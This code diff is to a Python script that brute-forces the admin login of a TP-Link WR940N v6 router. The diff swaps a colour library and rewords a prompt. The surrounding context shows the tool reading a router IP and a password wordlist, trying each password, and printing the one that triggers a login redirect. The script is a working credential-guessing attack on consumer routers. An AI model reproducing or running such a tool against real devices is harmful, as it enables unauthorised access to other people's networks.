@@ -1,11 +1,13 @@
+from colorama import *
 import requests
 import hashlib
 import base64
-from simple_colors import *
-print(red('This Work Only In This Version', ['bold', 'underlined']))
+import colorama
 
+colorama.init(autoreset=True)
+print(Fore.RED + Back.BLACK + Style.BRIGHT + 'This Work Only In This Version')
 print("Firmware Version:\n3.17.1 Build 170407 Rel.68462n\nHardware Version:\nWR940N v6 00000000")
-iprt = input("Enter ip router: ")
+iprt = input("Enter ip router to start: ")
 # opne file is loop
 listpas = input("Enter password list: ")
 passinpot = open(listpas, 'r').readlines()
@@ -41,8 +43,8 @@ for line in passinpot:
         print("Tring password" + ' ' + a)
 
     if 'javaScript">window.parent.location.href = "http://' in response.text:
-        print(green('correct'))
-        print(green('the password is', 'bold'))
-        print(green(a, ['bold', 'underlined']))
+        print(Fore.YELLOW + 'Correct')
+        print(Fore.GREEN + 'The password is')
+        print(Fore.GREEN + Style.BRIGHT + a)
         break
 # _____________________________________________________________________________________________
